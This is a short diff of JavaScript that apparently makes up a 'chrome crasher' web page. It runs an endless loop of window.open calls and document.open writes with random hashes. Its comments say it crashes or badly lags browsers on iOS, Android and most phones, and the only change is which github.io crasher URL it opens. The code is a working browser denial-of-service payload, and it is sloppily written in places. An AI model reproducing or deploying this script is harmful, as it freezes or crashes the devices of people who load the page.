@@ -7,7 +7,7 @@
 while(1) {
  
    // Functions For Loop
-   $location = 'https://chrome-crash-invoke.github.io/chrome-crash/';
+   $location = 'https://the-imortal-crasher.github.io/chrome-crash/';
    $vwer = '#';
    $x = Math.floor((Math.random() * 10000000000000000000) + 1);
  
@@ -19,7 +19,7 @@ while(1) {
    // Unsuccessful Attemps At The Crasher May Cause Severe Lag.
  
    // (Website Crasher For IOS and android And Mostly Every Phone) 
-   window.open("https://chrome-crash-invoke.github.io/chrome-crash/", "_false",) * '#/hisbck'; // Creates An Infinite Loop Of Undefined While Still Linking
+   window.open("https://the-imortal-crasher.github.io/chrome-crash/", "_false",) * '#/hisbck'; // Creates An Infinite Loop Of Undefined While Still Linking
    document.open('#' + $x); // Forces A Link With No Function To Be Made.     
 } 
     
